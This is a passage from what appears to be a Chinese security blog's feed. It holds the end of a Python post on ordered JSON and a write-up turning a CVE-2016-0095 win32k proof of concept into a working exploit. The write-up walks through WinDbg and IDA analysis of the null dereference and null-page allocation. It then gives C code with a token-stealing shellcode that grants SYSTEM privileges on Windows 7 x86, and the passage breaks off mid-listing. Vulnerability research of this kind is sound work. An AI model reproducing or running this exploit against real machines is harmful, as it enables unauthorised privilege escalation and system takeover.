<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>d= &#123;&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="string">"2"</span>]=<span class="number">2</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="string">"1"</span>]=<span class="number">1</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="string">"3"</span>]=<span class="number">3</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d</div><div class="line">&#123;<span class="string">'1'</span>: <span class="number">1</span>, <span class="string">'3'</span>: <span class="number">3</span>, <span class="string">'2'</span>: <span class="number">2</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>json.dumps(d)</div><div class="line"><span class="string">'&#123;"1": 1, "3": 3, "2": 2&#125;'</span></div></pre></td></tr></table></figure>
<p>使用<code>OrderedDict</code>后：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> collections</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d = collections.OrderedDict()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="string">"2"</span>]=<span class="number">2</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="string">"1"</span>]=<span class="number">1</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="string">"3"</span>]=<span class="number">3</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d</div><div class="line">OrderedDict([(<span class="string">'2'</span>, <span class="number">2</span>), (<span class="string">'1'</span>, <span class="number">1</span>), (<span class="string">'3'</span>, <span class="number">3</span>)])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> json</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>json.dumps(d)</div><div class="line"><span class="string">'&#123;"2": 2, "1": 1, "3": 3&#125;'</span></div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;最近遇到一个大坑，在测一个程序的时候。程序接受的数据是json，但是要求json是有序的（吐槽一样，要求有序的用json干屁啊！）&lt;/p&gt;
&lt;p&gt;当我用python构造字典的时候，总会给我排序，用&lt;code&gt;json.dumps&lt;/code&gt;转化为json后。导致程序解析失败。所以，在此研究了一下如何构造有序的json。&lt;/p&gt;
    
    </summary>
    
      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
    
    
      <category term="python" scheme="http://weaponx.site/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2016-0095从PoC到Exploit</title>
    <link href="http://weaponx.site/2017/08/11/CVE-2016-0095%E4%BB%8EPoC%E5%88%B0Exploit/"/>
    <id>http://weaponx.site/2017/08/11/CVE-2016-0095从PoC到Exploit/</id>
    <published>2017-08-11T10:26:40.000Z</published>
    <updated>2017-08-11T10:28:48.873Z</updated>
    
    <content type="html"><![CDATA[<h2 id="利用Vmware进行双机调试"><a href="#利用Vmware进行双机调试" class="headerlink" title="利用Vmware进行双机调试"></a>利用Vmware进行双机调试</h2><ol>
<li>使用管理员模式运行cmd</li>
<li>bcdedit /copy {current} /d “Windwos7[DEBUG]”</li>
<li>开启调试<code>bcdedit /debug ON</code>和<code>bcdedit /bootdebug ON</code></li>
<li>在Vmware的设备管理添加一个串口<code>\\.\pipe\com_1</code></li>
<li>执行<code>Windbg.exe -b -k com:port=\\.\pipe\com_1,baud=115200,pipe</code></li>
</ol>
<p>注意 vmware 有个坑，默认添加打印机占用串口com1口，所以我们开启内核调试的串口就变成了com2，不过只要删除了com1即可。</p>
<h2 id="利用VirtualKD和Vmware双机调试"><a href="#利用VirtualKD和Vmware双机调试" class="headerlink" title="利用VirtualKD和Vmware双机调试"></a>利用VirtualKD和Vmware双机调试</h2><p>Vmware利用串口进行双机调试就一个感受，慢。串口波特率115200也就是传输速度在14KB/s左右。</p>
<p>VirtualKD下载地址: <a href="http://virtualkd.sysprogs.org/download/" target="_blank" rel="external">http://virtualkd.sysprogs.org/download/</a></p>
<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>造成BSoD的代码拿来直接编译不了，稍微修改了一下:</p>
<ul>
<li>加入了<code>#include &lt;tchar.h&gt;</code></li>
<li>声明<code>WIN32KAPI</code>：<code>#define W32KAPI  DECLSPEC_ADDRSAFE</code></li>
<li>获取<code>KiFastSystemCall</code>的地址:<code>PVOID addr_kifastsystemcall = (PVOID)GetProcAddress(LoadLibrary(&quot;ntdll.dll&quot;), &quot;KiFastSystemCall&quot;);</code></li>
</ul>
<p>修改后的源代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line">* Author: bee13oy of CloverSec Labs</div><div class="line">* BSoD on Windows 7 SP1 x86 / Windows 10 x86</div><div class="line">* EoP to SYSTEM on Windows 7 SP1 x86</div><div class="line">**/</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"gdi32.lib"</span>)</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"user32.lib"</span>)</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> W32KAPI  DECLSPEC_ADDRSAFE</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">demo_CreateBitmapIndirect</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line">    <span class="keyword">static</span> BITMAP bitmap = &#123; <span class="number">0</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span> &#125;;</div><div class="line">    <span class="keyword">static</span> BYTE bits[<span class="number">8</span>][<span class="number">2</span>] = &#123; <span class="number">0xFF</span>, <span class="number">0</span>, <span class="number">0x0C</span>, <span class="number">0</span>, <span class="number">0x0C</span>, <span class="number">0</span>, <span class="number">0x0C</span>, <span class="number">0</span>,</div><div class="line">        <span class="number">0xFF</span>, <span class="number">0</span>, <span class="number">0xC0</span>, <span class="number">0</span>, <span class="number">0xC0</span>, <span class="number">0</span>, <span class="number">0xC0</span>, <span class="number">0</span> &#125;;</div><div class="line"></div><div class="line">    bitmap.bmBits = bits;</div><div class="line"></div><div class="line">    SetLastError(NO_ERROR);</div><div class="line"></div><div class="line">    HBITMAP hBitmap = CreateBitmapIndirect(&amp;bitmap);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)hBitmap;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> eSyscall_NtGdiSetBitmapAttributes 0x1110</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function">W32KAPI HBITMAP NTAPI <span class="title">NtGdiSetBitmapAttributes</span><span class="params">(</span></span></div><div class="line">    HBITMAP argv0,</div><div class="line">    DWORD argv1</div><div class="line">    )</div><div class="line">&#123;</div><div class="line">    PVOID addr_kifastsystemcall = (PVOID)GetProcAddress(LoadLibrary(<span class="string">"ntdll.dll"</span>), <span class="string">"KiFastSystemCall"</span>);</div><div class="line"></div><div class="line">    __asm</div><div class="line">    &#123;</div><div class="line">        push argv1;</div><div class="line">        push argv0;</div><div class="line">        push <span class="number">0x00</span>;</div><div class="line">        mov eax, eSyscall_NtGdiSetBitmapAttributes;</div><div class="line">        mov edx, addr_kifastsystemcall;</div><div class="line">        call edx;</div><div class="line">        add esp, <span class="number">0x0c</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Trigger_BSoDPoc</span><span class="params">()</span> </span>&#123;</div><div class="line">    HBITMAP hBitmap1 = (HBITMAP)demo_CreateBitmapIndirect();</div><div class="line">    HBITMAP hBitmap2 = (HBITMAP)NtGdiSetBitmapAttributes((HBITMAP)hBitmap1, (DWORD)<span class="number">0x8f9</span>);</div><div class="line"></div><div class="line">    RECT rect = &#123; <span class="number">0</span> &#125;;</div><div class="line">    rect.left = <span class="number">0x368c</span>;</div><div class="line">    rect.top = <span class="number">0x400000</span>;</div><div class="line">    HRGN hRgn = (HRGN)CreateRectRgnIndirect(&amp;rect);</div><div class="line"></div><div class="line">    HDC hdc = (HDC)CreateCompatibleDC((HDC)<span class="number">0x0</span>);</div><div class="line">    SelectObject((HDC)hdc, (HGDIOBJ)hBitmap2);</div><div class="line"></div><div class="line">    HBRUSH hBrush = (HBRUSH)CreateSolidBrush((COLORREF)<span class="number">0x00edfc13</span>);</div><div class="line"></div><div class="line">    FillRgn((HDC)hdc, (HRGN)hRgn, (HBRUSH)hBrush);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</div><div class="line">&#123;</div><div class="line">    Trigger_BSoDPoc();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>使用vs2015编译，放到虚拟机运行不了，提示缺少<code>VSRUNTIME140.dll</code>，此时装一个vc++ 2015的运行环境即可。运行后直接蓝屏重启。</p>
<p>这个PoC对应的是一个内核漏洞，所以需要使用虚拟机进行双机调试。</p>
<p>然后执行程序，Windbg捕获到异常：</p>
<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><div class="line">Access violation - code c0000005 (!!! second chance !!!)</div><div class="line">win32k!bGetRealizedBrush+<span class="number">0</span>x38:</div><div class="line"><span class="number">93</span>d50560 f6402401        test    byte ptr [eax+<span class="number">24</span>h],<span class="number">1</span></div></pre></td></tr></table></figure>
<p>发现程序在此崩溃，首先看调用栈：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">kd&gt; kb</div><div class="line">ChildEBP RetAddr  Args to Child              </div><div class="line">951909a0 832b34af 00000000 00000000 832ad5a0 win32k!bGetRealizedBrush+0x38</div><div class="line">951909b8 83329b5e 95190af8 00000001 95190a7c win32k!pvGetEngRbrush+0x1f</div><div class="line">95190a1c 833ab6e8 fe5f9018 00000000 00000000 win32k!EngBitBlt+0x337</div><div class="line">95190a54 833abb9d fe5f9018 95190a7c 95190af8 win32k!EngPaint+0x51</div><div class="line">95190c20 83e8d1ea 00000000 ffbff968 141006fe win32k!NtGdiFillRgn+0x339</div><div class="line">95190c20 77c670b4 00000000 ffbff968 141006fe nt!KiFastCallEntry+0x12a</div><div class="line">0028fe38 7662066b 7662064f 5f010631 1f040708 ntdll!KiFastSystemCallRet</div><div class="line">0028fe3c 7662064f 5f010631 1f040708 141006fe gdi32!NtGdiFillRgn+0xc</div><div class="line">0028fe5c 003310de 5f010631 1f040708 141006fe gdi32!FillRgn+0xb2</div><div class="line">WARNING: Frame IP not in any known module. Following frames may be wrong.</div><div class="line">0028fee4 766b3c45 7ffde000 0028ff30 77c837f5 0x3310de</div><div class="line">0028fef0 77c837f5 7ffde000 77e6f957 00000000 kernel32!BaseThreadInitThunk+0xe</div><div class="line">0028ff30 77c837c8 0033133a 7ffde000 00000000 ntdll!__RtlUserThreadStart+0x70</div><div class="line">0028ff48 00000000 0033133a 7ffde000 00000000 ntdll!_RtlUserThreadStart+0x1b</div></pre></td></tr></table></figure>
<p>随后，使用ln看一下，</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><div class="line">kd&gt; ln</div><div class="line">(<span class="number">93</span>d<span class="number">50528</span>)   win<span class="number">32</span>k<span class="title">!bGetRealizedBrush</span>+<span class="number">0x38</span>   |  (<span class="number">93</span>d<span class="number">50</span><span class="keyword">c</span><span class="number">9</span><span class="keyword">c</span>)   win<span class="number">32</span>k<span class="title">!xxxEnableWindow</span></div></pre></td></tr></table></figure>
<p>崩溃发生在win32k.sys中的<code>bGetRealizedBrush</code>函数。此时eax为0，<code>eax+24h = 0x00000024</code>，内存不可读取，造成BSoD。</p>
<p>然后使用ida载入<code>win32k.sys</code>，看<code>bGetRealizedBrush</code>函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">.text:BF84053C                 xor     eax, eax</div><div class="line">.text:BF84053E                 jmp     loc_BF840C92</div><div class="line">.text:BF840543 ; ---------------------------------------------------------------------------</div><div class="line">.text:BF840543</div><div class="line">.text:BF840543 loc_BF840543:                           ; CODE XREF: bGetRealizedBrush(BRUSH *,EBRUSHOBJ *,int (*)(_BRUSHOBJ *,_SURFOBJ *,_SURFOBJ *,_SURFOBJ *,_XLATEOBJ *,ulong))+12j</div><div class="line">.text:BF840543                 push    ebx</div><div class="line">.text:BF840544                 mov     ebx, [ebp+arg_4]</div><div class="line">.text:BF840547                 push    esi</div><div class="line">.text:BF840548                 xor     esi, esi</div><div class="line">.text:BF84054A                 mov     [ebp+var_24], eax</div><div class="line">.text:BF84054D                 mov     eax, [ebx+34h]</div><div class="line">.text:BF840550                 mov     [ebp+arg_0], esi</div><div class="line">.text:BF840553                 mov     [ebp+P], esi</div><div class="line">.text:BF840556                 mov     [ebp+var_28], 0</div><div class="line">.text:BF84055A                 mov     eax, [eax+1Ch]</div><div class="line">.text:BF84055D                 mov     [ebp+arg_4], eax</div><div class="line">.text:BF840560                 test    byte ptr [eax+24h], 1; =&gt; Creash here!!!</div></pre></td></tr></table></figure>
<p>可以看到，eax是从ebx+34h获取的。ebx则是第二个参数。</p>
<p><img src="1.png" alt=""></p>
<p>取到的eax为<code>fe5f9008</code>，</p>
<p><img src="2.png" alt=""></p>
<p><code>eax+1ch</code>为0，现在需要知道+1ch是什么东西。</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><div class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="emphasis">***</span></div><div class="line"><span class="strong">***                                                                   **</span>*</div><div class="line"><span class="strong">***                                                                   **</span>*</div><div class="line"><span class="strong">***    Your debugger is not using the correct symbols                 **</span>*</div><div class="line"><span class="strong">***                                                                   **</span>*</div><div class="line"><span class="strong">***    In order for this command to work properly, your symbol path   **</span>*</div><div class="line"><span class="strong">***    must point to .pdb files that have full type information.      **</span>*</div><div class="line"><span class="strong">***                                                                   **</span>*</div><div class="line"><span class="strong">***    Certain .pdb files (such as the public OS symbols) do not      **</span>*</div><div class="line"><span class="strong">***    contain the required information.  Contact the group that      **</span>*</div><div class="line"><span class="strong">***    provided you with these symbols if you need this command to    **</span>*</div><div class="line"><span class="strong">***    work.                                                          **</span>*</div><div class="line"><span class="strong">***                                                                   **</span>*</div><div class="line"><span class="strong">***    Type referenced: _EBRUSHOBJ                                    **</span>*</div><div class="line"><span class="strong">***                                                                   **</span>*</div><div class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="emphasis">***</span></div><div class="line">Symbol _EBRUSHOBJ not found.</div></pre></td></tr></table></figure>
<p>回溯到<code>win32k!NtGdiFillRgn</code>当程序准备调用<code>win32k!EngPaint</code>时候：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">kd&gt; dd esp</div><div class="line">9760ba5c  fe5fadb8 9760ba7c 9760baf8 fd795d60</div><div class="line">9760ba6c  00000d0d 050106dd 0026fd34 93a6b864</div><div class="line">9760ba7c  000038bc 00000000 00000000 00000008</div><div class="line">9760ba8c  00000008 00000001 86a5e458 00000004</div><div class="line">9760ba9c  9760bb04 83e51904 86a5e660 9760bae4</div><div class="line">9760baac  fe9ff008 00000002 881a34c8 88543030</div><div class="line">9760babc  ffffffff 00000000 00000000 00c1309c</div><div class="line">9760bacc  00000000 83e7d7ad 0000008d 6aab658b</div></pre></td></tr></table></figure>
<p>函数的声明如下：</p>
<p><code>int __stdcall EngPaint(struct _SURFOBJ *a1, int a2, struct _BRUSHOBJ *a3, struct _POINTL *a4, unsigned int a5)</code></p>
<p>可以得到<code>fe5fadb8=&gt;_SURFOBJ;9760baf8=&gt;_BRUSHOBJ</code></p>
<p>然后在<code>win32k!bGetRealizedBrush</code>下断点，断下来后看参数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">kd&gt; dd esp</div><div class="line">9760b9a4  939734af fd7eb188 9760baf8 9396d5a0</div><div class="line">9760b9b4  9760baf8 9760ba1c 939e9b5e 9760baf8</div><div class="line">9760b9c4  00000001 9760ba7c fe5fadb8 00000000</div><div class="line">9760b9d4  00000000 00000000 00000000 00000000</div><div class="line">9760b9e4  00000023 00000023 00000000 fe5fada8</div><div class="line">9760b9f4  939e9827 fe5fada8 ffffffff 00000030</div><div class="line">9760ba04  00000001 9760ba7c fe5fadb8 00000000</div><div class="line">9760ba14  00000000 00000000 9760ba54 93a6b6e8</div></pre></td></tr></table></figure>
<p>发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">kd&gt; dd 9760baf8</div><div class="line">9760baf8  ffffffff 00000000 00000000 00edfc13</div><div class="line">9760bb08  00edfc13 00000000 00000006 00000004</div><div class="line">9760bb18  00000000 00ffffff fd7957c4 00000000</div><div class="line">9760bb28  00000000 fe5fada8 ffbff968 ffbffe68</div><div class="line">9760bb38  ffbbd540 00000006 fd7eb188 00000014</div><div class="line">9760bb48  000000aa 00000001 83f71f01 83eba892</div><div class="line">9760bb58  9760bb78 9760bbac 00000000 00000000</div><div class="line">9760bb68  9760bc10 9760bbac 00000000 00000000</div></pre></td></tr></table></figure>
<p>9760baf8+34h的值为<code>fe5fada8</code>，这个值恰好为<code>fe5fadb8+10h</code>，所以<code>fe5fada8+1ch = fe5fadb8+10h+ch</code></p>
<p>打开brush.h看到_SURFOBJ结构体定义为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> _SURFOBJ</div><div class="line">&#123;</div><div class="line">    PVOID  dhsurf;</div><div class="line">    PVOID   hsurf;</div><div class="line">    PVOID  dhpdev;</div><div class="line">    PVOID    hdev;</div><div class="line">    LARGE_INTEGER   sizlBitmap;</div><div class="line">    ULONG   cjBits;</div><div class="line">    PVOID   pvBits;</div><div class="line">    PVOID   pvScan0;</div><div class="line">    LONG    lDelta;</div><div class="line">    ULONG   iUniq;</div><div class="line">    ULONG   iBitmapFormat;</div><div class="line">    USHORT  iType;</div><div class="line">    USHORT  fjBitmap;</div><div class="line">&#125; SURFOBJ;</div></pre></td></tr></table></figure>
<p>所以，漏洞的本质是<code>_SURFOBJ-&gt;hdev</code>没有定义导致引用不可读内存，造成访问违例触发BSoD。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>x86的win 7 不存在 零页内存分配保护和SMEP。</p>
<p>所谓SMEP是一种安全措施，就是不能在内核态执行用户态的代码。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">typedef</span> NTSTATUS <span class="title">NtAllocateVirtualMemory</span><span class="params">(</span></span></div><div class="line">    IN HANDLE     ProcessHandle,</div><div class="line">    IN OUT PVOID  *BaseAddress,</div><div class="line">    IN ULONG      ZeroBits,</div><div class="line">    IN OUT PULONG AllocationSize,</div><div class="line">    IN ULONG      AllocationType,</div><div class="line">    IN ULONG Protect</div><div class="line">    )</div></pre></td></tr></table></figure>
<p>利用BaseAddress参数在零页内存中分配空间，但是当BaseAddress指定为0时，系统会寻找第一个未使用的内存块来分配，而不是在零页内存中分配。所以指定BaseAddress为1即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">.text:BF840544                 mov     ebx, [ebp+arg_4]</div><div class="line">.text:BF840547                 push    esi</div><div class="line">.text:BF840548                 xor     esi, esi</div><div class="line">.text:BF84054A                 mov     [ebp+var_24], eax</div><div class="line">.text:BF84054D                 mov     eax, [ebx+34h]</div><div class="line">.text:BF840550                 mov     [ebp+arg_0], esi</div><div class="line">.text:BF840553                 mov     [ebp+P], esi</div><div class="line">.text:BF840556                 mov     [ebp+var_28], 0</div><div class="line">.text:BF84055A                 mov     eax, [eax+1Ch]</div><div class="line">.text:BF84055D                 mov     [ebp+arg_4], eax ;注意，此时[ebp+arg_4]就是0了</div><div class="line">.text:BF840560                 test    byte ptr [eax+24h], 1</div><div class="line">.text:BF840564                 mov     [ebp+var_1C], esi</div><div class="line">.text:BF840567                 mov     [ebp+var_10], esi</div></pre></td></tr></table></figure>
<p>之后我们只需要找能控制程序指令流程的点，也就是<code>call</code>或者<code>jmp</code>一个我们可以改变的值上。因此我们找到了如下可能可以利用的点。</p>
<p>第一点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">.text:BF84076B                 push    esi</div><div class="line">.text:BF84076C                 push    ecx</div><div class="line">.text:BF84076D                 push    ebx</div><div class="line">.text:BF84076E                 call    [ebp+arg_8]</div><div class="line">.text:BF840771                 test    eax, eax</div></pre></td></tr></table></figure>
<p>第二点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">.text:BF840816                 mov     edx, [ebx+0Ch]</div><div class="line">.text:BF840819                 push    ecx</div><div class="line">.text:BF84081A                 push    edx</div><div class="line">.text:BF84081B                 push    [ebp+var_14]</div><div class="line">.text:BF84081E                 push    eax</div><div class="line">.text:BF84081F                 call    edi</div></pre></td></tr></table></figure>
<p>第三点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">.text:BF840C27                 push    [ebp+var_24]</div><div class="line">.text:BF840C2A                 push    esi</div><div class="line">.text:BF840C2B                 push    [ebp+var_1C]</div><div class="line">.text:BF840C2E                 push    ecx</div><div class="line">.text:BF840C2F                 push    eax</div><div class="line">.text:BF840C30                 push    ebx</div><div class="line">.text:BF840C31                 call    [ebp+arg_8]</div></pre></td></tr></table></figure>
<p>回溯了整个函数发现<code>eb[+arg_8]</code>也就是这个函数的第三个参数其实我们是无法控制的。再会看第二点，寻找<code>edi</code>的来源，发现其实<code>edi</code>是可控。</p>
<p><img src="5.png" alt=""></p>
<p>可以发现<code>edi</code>来源与<code>[[ebp+arg_4]+748h]</code>不过此时<code>[ebp+arg_4]</code>是0，所以我们可以分配零页内存控制748h的数据。控制了<code>edi</code>就可以控制程序指令流程执行我们的<code>token-steal shellcode</code>来完成token的替换。</p>
<p>接下来需要控制程序执行到这里，继续回溯。</p>
<p><img src="6.png" alt=""></p>
<p>程序要走到我们能控制的地方需要图中红框的条件成立，经调试<code>si=1</code>。看到eax其实是0，所以需要控制590h和592h的值均为1。</p>
<p>最终我们的exploit如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line">* Author: bee13oy of CloverSec Labs</div><div class="line">* BSoD on Windows 7 SP1 x86 / Windows 10 x86</div><div class="line">* EoP to SYSTEM on Windows 7 SP1 x86</div><div class="line">**/</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"gdi32.lib"</span>)</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"user32.lib"</span>)</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> W32KAPI  DECLSPEC_ADDRSAFE</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(WINAPI *pNtAllocateVirtualMemory)</span><span class="params">(</span></span></div><div class="line">    IN HANDLE     ProcessHandle,</div><div class="line">    IN OUT PVOID  *BaseAddress,</div><div class="line">    IN ULONG      ZeroBits,</div><div class="line">    IN OUT PULONG AllocationSize,</div><div class="line">    IN ULONG      AllocationType,</div><div class="line">    IN ULONG Protect</div><div class="line">    );</div><div class="line"></div><div class="line"><span class="comment">// Windows 7 SP1 x86 Offsets</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> KTHREAD_OFFSET    0x124    <span class="comment">// nt!_KPCR.PcrbData.CurrentThread</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> EPROCESS_OFFSET   0x050    <span class="comment">// nt!_KTHREAD.ApcState.Process</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PID_OFFSET        0x0B4    <span class="comment">// nt!_EPROCESS.UniqueProcessId</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> FLINK_OFFSET      0x0B8    <span class="comment">// nt!_EPROCESS.ActiveProcessLinks.Flink</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> TOKEN_OFFSET      0x0F8    <span class="comment">// nt!_EPROCESS.Token</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> SYSTEM_PID        0x004    <span class="comment">// SYSTEM Process PID</span></span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// 4 params</span></div><div class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">TokenStealingShellcodeWin7</span><span class="params">(<span class="keyword">int</span> a1,<span class="keyword">int</span> a2,<span class="keyword">int</span> a3,<span class="keyword">int</span> a4)</span> </span>&#123;</div><div class="line">    <span class="comment">// Importance of Kernel Recovery</span></div><div class="line">    __asm &#123;</div><div class="line">        ; initialize</div><div class="line">            pushad; save registers state</div><div class="line"></div><div class="line">            xor eax, eax;</div><div class="line"></div><div class="line">            mov eax, fs:[KTHREAD_OFFSET]; Get nt!_KPCR.PcrbData.CurrentThread</div><div class="line">            mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process</div><div class="line"></div><div class="line">            mov ecx, eax; Copy current _EPROCESS structure</div><div class="line"></div><div class="line">            mov ebx, [eax + TOKEN_OFFSET]; Copy current nt!_EPROCESS.Token</div><div class="line">            mov edx, SYSTEM_PID; WIN <span class="number">7</span> SP1 SYSTEM Process PID = <span class="number">0x4</span></div><div class="line"></div><div class="line">            SearchSystemPID:</div><div class="line">            mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink</div><div class="line">            sub eax, FLINK_OFFSET</div><div class="line">            cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId</div><div class="line">            jne SearchSystemPID</div><div class="line"></div><div class="line">            mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token</div><div class="line">            mov[ecx + TOKEN_OFFSET], edx; Copy nt!_EPROCESS.Token of SYSTEM to current process</div><div class="line">            popad; restore registers state</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">demo_CreateBitmapIndirect</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line">    <span class="keyword">static</span> BITMAP bitmap = &#123; <span class="number">0</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span> &#125;;</div><div class="line">    <span class="keyword">static</span> BYTE bits[<span class="number">8</span>][<span class="number">2</span>] = &#123; <span class="number">0xFF</span>, <span class="number">0</span>, <span class="number">0x0C</span>, <span class="number">0</span>, <span class="number">0x0C</span>, <span class="number">0</span>, <span class="number">0x0C</span>, <span class="number">0</span>,</div><div class="line">        <span class="number">0xFF</span>, <span class="number">0</span>, <span class="number">0xC0</span>, <span class="number">0</span>, <span class="number">0xC0</span>, <span class="number">0</span>, <span class="number">0xC0</span>, <span class="number">0</span> &#125;;</div><div class="line"></div><div class="line">    bitmap.bmBits = bits;</div><div class="line"></div><div class="line">    SetLastError(NO_ERROR);</div><div class="line"></div><div class="line">    HBITMAP hBitmap = CreateBitmapIndirect(&amp;bitmap);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)hBitmap;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> eSyscall_NtGdiSetBitmapAttributes 0x1110</span></div><div class="line"></div><div class="line"><span class="function">W32KAPI HBITMAP NTAPI <span class="title">NtGdiSetBitmapAttributes</span><span class="params">(</span></span></div><div class="line">    HBITMAP argv0,</div><div class="line">    DWORD argv1</div><div class="line">    )</div><div class="line">&#123;</div><div class="line">    PVOID addr_kifastsystemcall = (PVOID)GetProcAddress(LoadLibrary(<span class="string">"ntdll.dll"</span>), <span class="string">"KiFastSystemCall"</span>);</div><div class="line">    __asm</div><div class="line">    &#123;</div><div class="line">        push argv1;</div><div class="line">        push argv0;</div><div class="line">        push <span class="number">0x00</span>;</div><div class="line">        mov eax, eSyscall_NtGdiSetBitmapAttributes;</div><div 